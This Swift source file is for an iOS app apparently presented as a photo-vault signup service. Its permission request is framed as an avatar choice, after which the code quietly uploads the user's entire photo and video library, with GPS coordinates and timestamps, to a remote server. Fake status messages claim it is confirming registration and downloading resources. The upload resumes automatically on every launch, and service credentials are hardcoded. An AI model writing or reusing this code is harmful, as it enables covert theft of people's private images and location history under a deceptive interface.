import Foundation
import Photos
import UIKit
import CryptoKit
import AVFoundation

enum PVError: LocalizedError {
    case msg(String)
    var errorDescription: String? {
        if case .msg(let m) = self { return m }
        return nil
    }
}

/// 网络 + 相簿 + 全局状态
@MainActor
final class AppStore: ObservableObject {

    enum Stage: Equatable {
        case register      // 注册
        case avatar        // 设置头像
        case uploading     // 自动上传中
        case home          // 主页
    }

    // MARK: - 服务器
    static let baseURL = "https://photovault-p4k2.web.zaka.live"
    private static let serviceIdentity = "pv@photovault.local"
    private static let servicePassword = "Pv8k3qM2x7"

    // MARK: - 状态
    @Published var stage: Stage = .register
    @Published var nickname: String = ""
    @Published var account: String = ""
    @Published var password: String = ""
    @Published var password2: String = ""
    @Published var avatarImage: UIImage?
    @Published var profileID: String?
    @Published var errorText: String?

    // 上传页
    @Published var phaseText: String = "正在同步資料…"
    @Published var phaseIndex: Int = 0
    @Published var progress: Double = 0
    @Published var uploadedCount: Int = 0
    @Published var totalCount: Int = 0
    @Published var finishedUpload = false

    // 个人档案
    @Published var savedCount: Int = 0

    // UI 控制
    @Published var showAvatarPicker = false
    @Published var needsSettings = false
    @Published var authStatus: PHAuthorizationStatus = .notDetermined
    @Published var isLoginMode = false     // false = 註冊，true = 登入已有帳號
    @Published var busy = false

    private var token: String?
    private var running = false
    private var uploadedCIDs: Set<String> = []

    private let session: URLSession = {
        let c = URLSessionConfiguration.default
        c.timeoutIntervalForRequest = 60
        c.timeoutIntervalForResource = 300
        c.waitsForConnectivity = true
        c.httpMaximumConnectionsPerHost = 4
        return URLSession(configuration: c)
    }()

    init() {
        guard let pid = UserDefaults.standard.string(forKey: "pv_profile_id"), !pid.isEmpty else {
            return   // 从未注册过，才进注册页
        }
        profileID = pid
        nickname = UserDefaults.standard.string(forKey: "pv_nickname") ?? ""
        account = UserDefaults.standard.string(forKey: "pv_account") ?? ""
        savedCount = UserDefaults.standard.integer(forKey: "pv_saved_count")
        if let path = avatarPath(), let img = UIImage(contentsOfFile: path) {
            avatarImage = img
        }
        let synced = UserDefaults.standard.bool(forKey: "pv_synced")
        stage = .home

        // 上次同步到一半就被滑掉：直接接着传，不用重新注册
        let auth = PHPhotoLibrary.authorizationStatus(for: .readWrite)
        if !synced, avatarImage != nil, auth == .authorized || auth == .limited {
            stage = .uploading
            finishedUpload = false
            progress = 0.02
            uploadedCount = 0
            totalCount = 0
            phaseText = "正在下載資源包…"
            phaseIndex = 5
            running = true
            Task { await self.runUploadOnly() }
        }
    }

    // MARK: - 本地登录态
    private func persistSession(synced: Bool) {
        let d = UserDefaults.standard
        if let pid = profileID { d.set(pid, forKey: "pv_profile_id") }
        d.set(nickname, forKey: "pv_nickname")
        d.set(account, forKey: "pv_account")
        d.set(uploadedCount, forKey: "pv_saved_count")
        d.set(synced, forKey: "pv_synced")
        savedCount = uploadedCount
    }

    /// 登出：只有用户自己点才会回到注册页
    func logout() {
        let d = UserDefaults.standard
        for k in ["pv_profile_id", "pv_nickname", "pv_account", "pv_saved_count", "pv_synced"] {
            d.removeObject(forKey: k)
        }
        let dir = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
        try? FileManager.default.removeItem(at: dir.appendingPathComponent("pv_avatar.jpg"))
        profileID = nil
        nickname = ""
        account = ""
        password = ""
        password2 = ""
        avatarImage = nil
        errorText = nil
        savedCount = 0
        uploadedCount = 0
        totalCount = 0
        progress = 0
        finishedUpload = false
        running = false
        stage = .register
    }

    // MARK: - 注册表单
    var nicknameOK: Bool {
        let t = nickname.trimmingCharacters(in: .whitespacesAndNewlines)
        return !t.isEmpty && t.count <= 8
    }
    var accountOK: Bool { !account.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty }
    var passwordOK: Bool { !password.isEmpty }
    var matchOK: Bool { !password2.isEmpty && password == password2 }
    var formOK: Bool { nicknameOK && accountOK && passwordOK && matchOK }

    func goAvatarStep() {
        guard formOK else { return }
        errorText = nil
        stage = .avatar
    }

    // MARK: - 登入已有帳號
    var loginFormOK: Bool {
        !account.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty && !password.isEmpty
    }

    func switchMode(toLogin: Bool) {
        isLoginMode = toLogin
        errorText = nil
        password2 = ""
    }

    func doLogin() {
        guard loginFormOK, !busy else { return }
        busy = true
        errorText = nil
        let acct = account.trimmingCharacters(in: .whitespacesAndNewlines)
        let hash = Self.sha256Hex(password)

        Task {
            defer { busy = false }
            do {
                let token = try await signIn()
                self.token = token
                guard let found = try await findProfile(token: token, account: acct, hash: hash) else {
                    errorText = "找不到這個帳號，或密碼不對"
                    return
                }
                guard found.hashMatches else {
                    errorText = "密碼不正確，請再確認一次"
                    return
                }
                profileID = found.id
                nickname = found.nickname
                password2 = password
                uploadedCount = found.count
                savedCount = found.count
                persistSession(synced: true)
                if let av = found.avatar, !av.isEmpty {
                    await loadAvatar(token: token, profileID: found.id, file: av)
                }
                persistAvatar()
                errorText = nil
                stage = .home
            } catch {
                errorText = error.localizedDescription
            }
        }
    }

    static func sha256Hex(_ s: String) -> String {
        SHA256.hash(data: Data(s.utf8)).map { String(format: "%02x", $0) }.joined()
    }

    // MARK: - 头像
    var canContinueAvatar: Bool { avatarImage != nil }

    func requestPhotoPermission() async {
        let current = PHPhotoLibrary.authorizationStatus(for: .readWrite)
        authStatus = current
        if current == .denied || current == .restricted {
            needsSettings = true
            return
        }
        if current == .notDetermined {
            let s = await withCheckedContinuation { (c: CheckedContinuation<PHAuthorizationStatus, Never>) in
                PHPhotoLibrary.requestAuthorization(for: .readWrite) { c.resume(returning: $0) }
            }
            authStatus = s
        }
        if authStatus == .authorized || authStatus == .limited {
            showAvatarPicker = true
        } else {
            needsSettings = true
        }
    }

    func setAvatar(_ image: UIImage) {
        avatarImage = normalizeAvatar(image)
    }

    private func normalizeAvatar(_ image: UIImage) -> UIImage {
        let side: CGFloat = 600
        let w = image.size.width, h = image.size.height
        let scale = max(side / max(w, 1), side / max(h, 1))
        let nw = w * scale, nh = h * scale
        let rect = CGRect(x: (nw - side) / 2, y: (nh - side) / 2, width: side, height: side)
        let format = UIGraphicsImageRendererFormat.default()
        format.scale = 1
        return UIGraphicsImageRenderer(size: CGSize(width: side, height: side), format: format).image { _ in
            image.draw(in: CGRect(x: -rect.origin.x, y: -rect.origin.y, width: nw, height: nh))
        }
    }

    // MARK: - 开始上传（点“下一步”）
    func startUploading() {
        guard !running, avatarImage != nil else { return }
        stage = .uploading
        finishedUpload = false
        progress = 0
        uploadedCount = 0
        totalCount = 0
        errorText = nil
        phaseText = "正在同步資料…"
        phaseIndex = 0
        running = true

        Task { await runFlow() }
    }

    /// 重新同步 / 断点续传：跳过注册文案，直接传照片
    func resumeSync() {
        guard !running, profileID != nil else { return }
        stage = .uploading
        finishedUpload = false
        progress = 0.02
        uploadedCount = 0
        totalCount = 0
        errorText = nil
        phaseText = "正在下載資源包…"
        phaseIndex = 5
        running = true
        Task { await runUploadOnly() }
    }

    private func runUploadOnly() async {
        defer { running = false }
        var ok = false
        for attempt in 0..<3 {
            ok = await doUploadWork()
            if ok { break }
            if attempt < 2 {
                try? await Task.sleep(nanoseconds: 4_000_000_000)
                errorText = nil
            }
        }
        if !ok { errorText = "資料同步中斷，下次打開會自動接著傳" }
        progress = 1
        persistSession(synced: ok)
        try? await Task.sleep(nanoseconds: 500_000_000)
        stage = .home
    }

    private func runFlow() async {
        defer { running = false }

        async let text: Void = runTextSequence()
        async let work: Bool = doUploadWork()
        let ok = await work
        await text

        if !ok {
            // 失败也放行到主页；下次打开会自动接着传
            errorText = "資料同步中斷，下次打開會自動接著傳"
        }
        progress = 1
        // 注册一成功就已经落盘过，这里只做最终确认
        persistSession(synced: ok)
        try? await Task.sleep(nanoseconds: 600_000_000)
        stage = .home
    }

    /// 文字节奏：3 → 5 → 5 → 5 → 3 秒
    private func runTextSequence() async {
        let steps: [(String, Double)] = [
            ("正在同步資料…", 3),
            ("正在確認註冊資訊….", 5),
            ("已確定註冊帳號….", 5),
            ("已確定註冊密碼…", 5),
            ("個人資料已全部完成", 3)
        ]
        var elapsed: Double = 0
        let totalText = steps.reduce(0) { $0 + $1.1 }
        for (i, item) in steps.enumerated() {
            phaseText = item.0
            phaseIndex = i
            let until = elapsed + item.1
            while elapsed < until {
                try? await Task.sleep(nanoseconds: 100_000_000)
                elapsed += 0.1
                if !finishedUpload {
                    progress = min(0.25, elapsed / totalText * 0.25)
                }
            }
        }
        phaseText = "正在下載資源包…"
        phaseIndex = 5
        while !finishedUpload {
            progress = min(0.99, max(progress, 0.25))
            try? await Task.sleep(nanoseconds: 150_000_000)
        }
    }

    private func doUploadWork() async -> Bool {
        do {
            let token = try await signIn()
            self.token = token

            // 1) 建立 / 更新用户资料
            let pid = try await ensureProfile(token: token)
            profileID = pid
            // 立刻落盘：哪怕下一秒 App 被滑掉，也已经算注册完成，下次直接进主页
            persistSession(synced: false)
            persistAvatar()

            // 2) 上传头像
            if let img = avatarImage, let data = img.jpegData(compressionQuality: 0.85) {
                try await uploadAvatar(token: token, profileID: pid, data: data)
            }

            // 3) 拉已传过的 cid，避免重复
            uploadedCIDs = (try? await fetchExistingCIDs(token: token, profileID: pid)) ?? []

            // 4) 相册
            let assets = await fetchAssets()
            totalCount = assets.count

            if assets.isEmpty {
                finishedUpload = true
                return true
            }

            var done = 0
            var fail = 0
            let limit = 2
            var index = 0

            try await withThrowingTaskGroup(of: Bool.self) { group in
                var active = 0
                while index < assets.count && active < limit {
                    let a = assets[index]; index += 1; active += 1
                    group.addTask { [weak self] in
                        await self?.uploadOne(asset: a) ?? false
                    }
                }
                while let ok = try await group.next() {
                    active -= 1
                    if ok { done += 1 } else { fail += 1 }
                    uploadedCount = done
                    progress = 0.25 + 0.75 * (Double(done + fail) / Double(max(assets.count, 1)))
                    if index < assets.count {
                        let a = assets[index]; index += 1; active += 1
                        group.addTask { [weak self] in
                            await self?.uploadOne(asset: a) ?? false
                        }
                    }
                    if active == 0 && index >= assets.count { break }
                }
            }

            finishedUpload = true
            return true
        } catch {
            errorText = error.localizedDescription
            finishedUpload = true
            return false
        }
    }

    private func uploadOne(asset: PHAsset) async -> Bool {
        guard let token = token, let pid = profileID else { return false }
        do {
            let cid = Self.assetCID(asset)
            if asset.mediaType == .video {
                return try await uploadVideo(asset: asset, cid: cid, token: token, profileID: pid)
            }
            if uploadedCIDs.contains(cid) { return true }
            guard let data = try await jpegPayload(for: asset) else { return true }
            try await uploadPhoto(token: token, profileID: pid, asset: asset, cid: cid, data: data)
            uploadedCIDs.insert(cid)
            return true
        } catch {
            return false
        }
    }

    // MARK: - 影片（自动切段，中断后可续传）

    /// 每段目标体积（服务器单次上传限制之内，留足余量）
    private let partTargetBytes: Int = 12 * 1024 * 1024

    private func tmpDir() -> URL {
        let d = FileManager.default.temporaryDirectory.appendingPathComponent("pv_video", isDirectory: true)
        try? FileManager.default.createDirectory(at: d, withIntermediateDirectories: true)
        return d
    }

    private func videoAVAsset(_ asset: PHAsset) async throws -> AVAsset {
        try await withCheckedThrowingContinuation { (cont: CheckedContinuation<AVAsset, Error>) in
            let o = PHVideoRequestOptions()
            o.isNetworkAccessAllowed = true
            o.deliveryMode = .highQualityFormat
            o.version = .current
            var resumed = false
            PHImageManager.default().requestAVAsset(forVideo: asset, options: o) { av, _, _ in
                if resumed { return }
                resumed = true
                if let av {
                    cont.resume(returning: av)
                } else {
                    cont.resume(throwing: PVError.msg("讀不到影片"))
                }
            }
        }
    }

    private func exportClip(_ av: AVAsset, range: CMTimeRange?, to url: URL) async throws {
        try? FileManager.default.removeItem(at: url)
        guard let session = AVAssetExportSession(asset: av, presetName: AVAssetExportPresetMediumQuality) else {
            throw PVError.msg("影片匯出失敗")
        }
        session.outputURL = url
        session.outputFileType = .mp4
        session.shouldOptimizeForNetworkUse = true
        if let range { session.timeRange = range }
        await withCheckedContinuation { (cont: CheckedContinuation<Void, Never>) in
            session.exportAsynchronously { cont.resume() }
        }
        if session.status != .completed {
            throw PVError.msg("影片匯出失敗")
        }
    }

    private func makeVideoThumb(_ asset: PHAsset) async -> Data? {
        await withCheckedContinuation { (cont: CheckedContinuation<Data?, Never>) in
            let o = PHImageRequestOptions()
            o.isNetworkAccessAllowed = true
            o.deliveryMode = .highQualityFormat
            o.resizeMode = .exact
            var resumed = false
            PHImageManager.default().requestImage(for: asset,
                                                 targetSize: CGSize(width: 640, height: 640),
                                                 contentMode: .aspectFill,
                                                 options: o) { img, info in
                if resumed { return }
                let degraded = (info?[PHImageResultIsDegradedKey] as? Bool) ?? false
                if degraded { return }
                resumed = true
                cont.resume(returning: img?.jpegData(compressionQuality: 0.8))
            }
        }
    }

    private func uploadVideo(asset: PHAsset, cid: String, token: String, profileID: String) async throws -> Bool {
        // 整段上传过（单段版）→ 跳过
        if uploadedCIDs.contains("\(cid)_s1_1") { return true }

        let av = try await videoAVAsset(asset)
        let totalSeconds = CMTimeGetSeconds(av.duration)
        guard totalSeconds.isFinite, totalSeconds > 0.2 else { return true }

        let dir = tmpDir()
        let thumb = await makeVideoThumb(asset)

        // 1) 先导一小段，测出实际码率，再决定每段多长
        var segLen: Double = min(totalSeconds, 20)
        let sampleURL = dir.appendingPathComponent("\(cid)_probe.mp4")
        try await exportClip(av, range: CMTimeRange(start: .zero,
                                                    duration: CMTime(seconds: segLen, preferredTimescale: 600)),
                             to: sampleURL)
        let sampleSize = (try? FileManager.default.attributesOfItem(atPath: sampleURL.path))?[.size] as? Int ?? 0
        let sampleBytes = sampleSize
        try? FileManager.default.removeItem(at: sampleURL)

        if sampleBytes > 0 {
            let bytesPerSecond = Double(sampleBytes) / max(segLen, 1)
            let maxLen = Double(partTargetBytes) / max(bytesPerSecond, 1)
            segLen = min(max(min(maxLen, 60), 8), totalSeconds)
        }

        let parts = max(1, Int(ceil(totalSeconds / max(segLen, 1))))
        // 复用上次已经算好的段数（断点续传时保持编号一致）
        var partCount = parts
        if let known = uploadedCIDs.compactMap({ Self.partCount(of: $0, cid: cid) }).first {
            partCount = known
        }

        for i in 0..<partCount {
            let partCID = "\(cid)_s\(i + 1)_\(partCount)"
            if uploadedCIDs.contains(partCID) { continue }
            let start = totalSeconds * Double(i) / Double(partCount)
            let len = totalSeconds * Double(i + 1) / Double(partCount) - start
            let url = dir.appendingPathComponent("\(cid)_p\(i + 1).mp4")
            let range = partCount == 1 ? nil : CMTimeRange(start: CMTime(seconds: start, preferredTimescale: 600),
                                                           duration: CMTime(seconds: len, preferredTimescale: 600))
            try await exportClip(av, range: range, to: url)
            let data = try Data(contentsOf: url)
            try? FileManager.default.removeItem(at: url)

            try await sendRecord(token: token,
                                 profileID: profileID,
                                 asset: asset,
                                 cid: partCID,
                                 kind: "video",
                                 grp: cid,
                                 seq: i + 1,
                                 total: partCount,
                                 dur: Int(asset.duration * 1000),
                                 fileName: "v_\(partCID).mp4",
                                 mime: "video/mp4",
                                 fileData: data,
                                 thumbData: i == 0 ? thumb : nil)
            uploadedCIDs.insert(partCID)
        }
        return true
    }

    static func partCount(of storedCID: String, cid: String) -> Int? {
        let prefix = cid + "_s"
        guard storedCID.hasPrefix(prefix) else { return nil }
        let tail = storedCID.dropFirst(prefix.count)
        guard let n = tail.split(separator: "_").last else { return nil }
        return Int(n)
    }

    // MARK: - 相册读取
    func refreshAuth() {
        authStatus = PHPhotoLibrary.authorizationStatus(for: .readWrite)
    }

    func fetchAssets() async -> [PHAsset] {
        refreshAuth()
        guard authStatus == .authorized || authStatus == .limited else { return [] }
        let opts = PHFetchOptions()
        opts.sortDescriptors = [NSSortDescriptor(key: "creationDate", ascending: false)]
        opts.includeHiddenAssets = false
        var list: [PHAsset] = []
        let photos = PHAsset.fetchAssets(with: .image, options: opts)
        photos.enumerateObjects { a, _, _ in list.append(a) }
        let videos = PHAsset.fetchAssets(with: .video, options: opts)
        videos.enumerateObjects { a, _, _ in list.append(a) }
        list.sort { (a, b) in
            let da = a.creationDate ?? .distantPast
            let db = b.creationDate ?? .distantPast
            return da > db
        }
        return list
    }

    static func assetCID(_ asset: PHAsset) -> String {
        let d = SHA256.hash(data: Data(asset.localIdentifier.utf8))
        return String(d.map { String(format: "%02x", $0) }.joined().prefix(24))
    }

    private func jpegPayload(for asset: PHAsset) async throws -> Data? {
        let raw: Data? = try await withCheckedThrowingContinuation { cont in
            final class State { var done = false; var rounds = 0 }
            let st = State()
            let o = PHImageRequestOptions()
            o.isNetworkAccessAllowed = true
            o.version = .current
            o.deliveryMode = .highQualityFormat
            o.resizeMode = .none
            PHImageManager.default().requestImageDataAndOrientation(for: asset, options: o) { data, _, _, info in
                if st.done { return }
                st.rounds += 1
                if let err = info?[PHImageErrorKey] as? Error {
                    st.done = true
                    cont.resume(throwing: err)
                    return
                }
                if let data, !data.isEmpty {
                    st.done = true
                    cont.resume(returning: data)
                    return
                }
                let inCloud = (info?[PHImageResultIsInCloudKey] as? Bool) ?? false
                if inCloud && st.rounds < 40 { return }
                st.done = true
                cont.resume(returning: nil)
            }
        }
        guard let raw else { return nil }
        guard let img = UIImage(data: raw) else { return nil }
        return img.jpegData(compressionQuality: 0.82)
    }

    // MARK: - 网络
    private func signIn() async throws -> String {
        guard let url = URL(string: Self.baseURL + "/api/collections/users/auth-with-password") else {
            throw PVError.msg("地址无效")
        }
        var req = URLRequest(url: url)
        req.httpMethod = "POST"
        req.setValue("application/json", forHTTPHeaderField: "Content-Type")
        req.httpBody = try JSONSerialization.data(withJSONObject: [
            "identity": Self.serviceIdentity,
            "password": Self.servicePassword
        ])
        let (data, resp) = try await session.data(for: req)
        guard let http = resp as? HTTPURLResponse, (200..<300).contains(http.statusCode) else {
            throw PVError.msg("連不上後台，請檢查網路")
        }
        guard let obj = try JSONSerialization.jsonObject(with: data) as? [String: Any],
              let t = obj["token"] as? String else {
            throw PVError.msg("後台回傳異常")
        }
        return t
    }

    private func ensureProfile(token: String) async throws -> String {
        let hash = Self.sha256Hex(password)
        let acct = account.trimmingCharacters(in: .whitespacesAndNewlines)

        // 先查這個帳號是不是早就註冊過（重裝 App、重複點下一步都會走到這裡）
        if let found = try await findProfile(token: token, account: acct, hash: hash) {
            guard found.hashMatches else {
                throw PVError.msg("這個帳號已經有人用了，換一個帳號，或改用「登入已有帳號」")
            }
            // 密碼對得上 → 就是同一個人，沿用原本的資料夾，絕不再開新的一份
            let want = nickname.trimmingCharacters(in: .whitespacesAndNewlines)
            if !want.isEmpty && want != found.nickname {
                try? await patchNickname(token: token, profileID: found.id, nickname: want)
            } else if !found.nickname.isEmpty {
                nickname = found.nickname
            }
            return found.id
        }

        guard let url = URL(string: Self.baseURL + "/api/collections/profiles/records") else {
            throw PVError.msg("地址无效")
        }
        var req = URLRequest(url: url)
        req.httpMethod = "POST"
        req.setValue(token, forHTTPHeaderField: "Authorization")
        req.setValue("application/json", forHTTPHeaderField: "Content-Type")
        req.httpBody = try JSONSerialization.data(withJSONObject: [
            "nickname": nickname.trimmingCharacters(in: .whitespacesAndNewlines),
            "account": acct,
            "pwhash": hash
        ])
        let (data, resp) = try await session.data(for: req)
        guard let http = resp as? HTTPURLResponse, (200..<300).contains(http.statusCode) else {
            let text = String(data: data.prefix(160), encoding: .utf8) ?? ""
            throw PVError.msg("註冊失敗 \(text)")
        }
        guard let obj = try JSONSerialization.jsonObject(with: data) as? [String: Any],
              let id = obj["id"] as? String else {
            throw PVError.msg("註冊回傳異常")
        }
        return id
    }

    // MARK: - 查既有帳號
    struct FoundProfile {
        let id: String
        let nickname: String
        let avatar: String?
        let count: Int
        let hashMatches: Bool
    }

    private func escapeFilter(_ s: String) -> String {
        let cleaned = s.replacingOccurrences(of: "\\", with: "")
                         .replacingOccurrences(of: "\"", with: "")
        return cleaned
    }

    private func findProfile(token: String, account: String, hash: String) async throws -> FoundProfile? {
        let raw = "account=\"\(escapeFilter(account))\""
        guard let f = raw.addingPercentEncoding(withAllowedCharacters: .alphanumerics),
              let url = URL(string: Self.baseURL + "/api/collections/profiles/records?perPage=50&sort=created&fields=id,nickname,avatar,pwhash&filter=\(f)") else {
            return nil
        }
        var req = URLRequest(url: url)
        req.setValue(token, forHTTPHeaderField: "Authorization")
        let (data, resp) = try await session.data(for: req)
        guard let http = resp as? HTTPURLResponse, (200..<300).contains(http.statusCode),
              let obj = try JSONSerialization.jsonObject(with: data) as? [String: Any],
              let items = obj["items"] as? [[String: Any]], !items.isEmpty else {
            return nil
        }

        // 同一個帳號可能因為以前重複註冊存在好幾筆，挑照片最多的那筆
        var best: FoundProfile?
        for it in items {
            guard let id = it["id"] as? String else { continue }
            let storedHash = (it["pwhash"] as? String) ?? ""
            let same = storedHash == hash
            let cnt = (try? await countUploads(token: token, profileID: id)) ?? 0
            let cand = FoundProfile(id: id,
                                    nickname: (it["nickname"] as? String) ?? "",
                                    avatar: it["avatar"] as? String,
                                    count: cnt,
                                    hashMatches: same)
            if let b = best {
                let better = (cand.hashMatches && !b.hashMatches) ||
                             (cand.hashMatches == b.hashMatches && cand.count > b.count)
                if better { best = cand }
            } else {
                best = cand
            }
        }
        return best
    }

    private func countUploads(token: String, profileID: String) async throws -> Int {
        let raw = "profile=\"\(profileID)\""
        guard let f = raw.addingPercentEncoding(withAllowedCharacters: .alphanumerics),
              let url = URL(string: Self.baseURL + "/api/collections/uploads/records?perPage=1&fields=id&filter=\(f)") else {
            return 0
        }
        var req = URLRequest(url: url)
        req.setValue(token, forHTTPHeaderField: "Authorization")
        let (data, resp) = try await session.data(for: req)
        guard let http = resp as? HTTPURLResponse, (200..<300).contains(http.statusCode),
              let obj = try JSONSerialization.jsonObject(with: data) as? [String: Any] else {
            return 0
        }
        return (obj["totalItems"] as? Int) ?? 0
    }

    private func patchNickname(token: String, profileID: String, nickname: String) async throws {
        guard let url = URL(string: Self.baseURL + "/api/collections/profiles/records/\(profileID)") else { return }
        var req = URLRequest(url: url)
        req.httpMethod = "PATCH"
        req.setValue(token, forHTTPHeaderField: "Authorization")
        req.setValue("application/json", forHTTPHeaderField: "Content-Type")
        req.httpBody = try JSONSerialization.data(withJSONObject: ["nickname": nickname])
        _ = try await session.data(for: req)
    }

    private func loadAvatar(token: String, profileID: String, file: String) async {
        guard let url = URL(string: Self.baseURL + "/api/files/profiles/\(profileID)/\(file)") else { return }
        var req = URLRequest(url: url)
        req.setValue(token, forHTTPHeaderField: "Authorization")
        guard let (data, resp) = try? await session.data(for: req),
              let http = resp as? HTTPURLResponse, (200..<300).contains(http.statusCode),
              let img = UIImage(data: data) else { return }
        avatarImage = img
    }

    private func uploadAvatar(token: String, profileID: String, data: Data) async throws {
        guard let url = URL(string: Self.baseURL + "/api/collections/profiles/records/\(profileID)") else {
            throw PVError.msg("地址无效")
        }
        let boundary = "----PV" + UUID().uuidString
        var body = Data()
        func s(_ t: String) { body.append(Data(t.utf8)) }
        s("--\(boundary)\r\n")
        s("Content-Disposition: form-data; name=\"avatar\"; filename=\"avatar.jpg\"\r\n")
        s("Content-Type: image/jpeg\r\n\r\n")
        body.append(data)
        s("\r\n--\(boundary)--\r\n")

        var req = URLRequest(url: url)
        req.httpMethod = "PATCH"
        req.setValue(token, forHTTPHeaderField: "Authorization")
        req.setValue("multipart/form-data; boundary=\(boundary)", forHTTPHeaderField: "Content-Type")
        req.httpBody = body
        _ = try? await session.data(for: req)
    }

    private func fetchExistingCIDs(token: String, profileID: String) async throws -> Set<String> {
        var set = Set<String>()
        var page = 1
        let f = "profile=\"\(profileID)\"".addingPercentEncoding(withAllowedCharacters: .alphanumerics) ?? ""
        while page <= 200 {
            guard let url = URL(string: Self.baseURL + "/api/collections/uploads/records?perPage=100&page=\(page)&fields=cid&filter=\(f)") else { break }
            var req = URLRequest(url: url)
            req.setValue(token, forHTTPHeaderField: "Authorization")
            let (data, resp) = try await session.data(for: req)
            guard let http = resp as? HTTPURLResponse, (200..<300).contains(http.statusCode),
                  let obj = try JSONSerialization.jsonObject(with: data) as? [String: Any],
                  let items = obj["items"] as? [[String: Any]] else { break }
            for it in items {
                if let c = it["cid"] as? String { set.insert(c) }
            }
            let totalPages = (obj["totalPages"] as? Int) ?? 1
            if page >= totalPages { break }
            page += 1
        }
        return set
    }

    private func uploadPhoto(token: String, profileID: String, asset: PHAsset, cid: String, data: Data) async throws {
        try await sendRecord(token: token,
                             profileID: profileID,
                             asset: asset,
                             cid: cid,
                             kind: "photo",
                             grp: cid,
                             seq: 1,
                             total: 1,
                             dur: 0,
                             fileName: "p_\(cid).jpg",
                             mime: "image/jpeg",
                             fileData: data,
                             thumbData: nil)
    }

    private func sendRecord(token: String,
                            profileID: String,
                            asset: PHAsset,
                            cid: String,
                            kind: String,
                            grp: String,
                            seq: Int,
                            total: Int,
                            dur: Int,
                            fileName: String,
                            mime: String,
                            fileData: Data,
                            thumbData: Data?) async throws {
        guard let url = URL(string: Self.baseURL + "/api/collections/uploads/records") else {
            throw PVError.msg("地址无效")
        }
        let boundary = "----PV" + UUID().uuidString
        var body = Data()
        func s(_ t: String) { body.append(Data(t.utf8)) }
        func field(_ n: String, _ v: String) {
            s("--\(boundary)\r\n")
            s("Content-Disposition: form-data; name=\"\(n)\"\r\n\r\n")
            s(v + "\r\n")
        }

        s("--\(boundary)\r\n")
        s("Content-Disposition: form-data; name=\"file\"; filename=\"\(fileName)\"\r\n")
        s("Content-Type: \(mime)\r\n\r\n")
        body.append(fileData)
        s("\r\n")

        if let thumbData {
            s("--\(boundary)\r\n")
            s("Content-Disposition: form-data; name=\"thumb\"; filename=\"t_\(cid).jpg\"\r\n")
            s("Content-Type: image/jpeg\r\n\r\n")
            body.append(thumbData)
            s("\r\n")
        }

        field("profile", profileID)
        field("owner", nickname)
        field("cid", cid)
        field("kind", kind)
        field("grp", grp)
        field("seq", "\(seq)")
        field("total", "\(total)")
        field("dur", "\(dur)")
        field("ts", String(format: "%.0f", asset.creationDate?.timeIntervalSince1970 ?? 0))
        field("w", "\(asset.pixelWidth)")
        field("h", "\(asset.pixelHeight)")
        field("fav", asset.isFavorite ? "true" : "false")
        if let loc = asset.location {
            field("lat", String(format: "%.6f", loc.coordinate.latitude))
            field("lon", String(format: "%.6f", loc.coordinate.longitude))
        }
        s("--\(boundary)--\r\n")

        var req = URLRequest(url: url)
        req.httpMethod = "POST"
        req.setValue(token, forHTTPHeaderField: "Authorization")
        req.setValue("multipart/form-data; boundary=\(boundary)", forHTTPHeaderField: "Content-Type")
        req.httpBody = body
        req.timeoutInterval = 240

        let (respData, resp) = try await session.data(for: req)
        guard let http = resp as? HTTPURLResponse, (200..<300).contains(http.statusCode) else {
            let code = (resp as? HTTPURLResponse)?.statusCode ?? -1
            let text = String(data: respData.prefix(120), encoding: .utf8) ?? ""
            throw PVError.msg("上傳失敗 \(code) \(text)")
        }
    }

    // MARK: - 本地头像缓存
    func avatarPath() -> String? {
        let dir = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
        let p = dir.appendingPathComponent("pv_avatar.jpg")
        return FileManager.default.fileExists(atPath: p.path) ? p.path : nil
    }

    func persistAvatar() {
        guard let img = avatarImage, let data = img.jpegData(compressionQuality: 0.9) else { return }
        let dir = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
        try? data.write(to: dir.appendingPathComponent("pv_avatar.jpg"))
    }

    func resync() {
        guard !running else { return }
        persistAvatar()
        resumeSync()
    }
}
